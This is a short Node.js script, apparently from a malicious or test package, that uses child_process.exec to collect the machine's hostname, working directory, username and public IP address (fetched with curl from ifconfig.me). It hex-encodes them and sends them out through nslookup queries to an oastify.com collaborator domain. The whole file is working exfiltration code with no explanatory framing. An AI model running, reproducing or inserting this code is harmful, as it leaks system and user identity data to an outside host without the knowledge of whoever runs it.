const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'linkanx';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $a.jm90wboytr298dd115yfp95r5ib8zx.oastify.com;done" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);

});
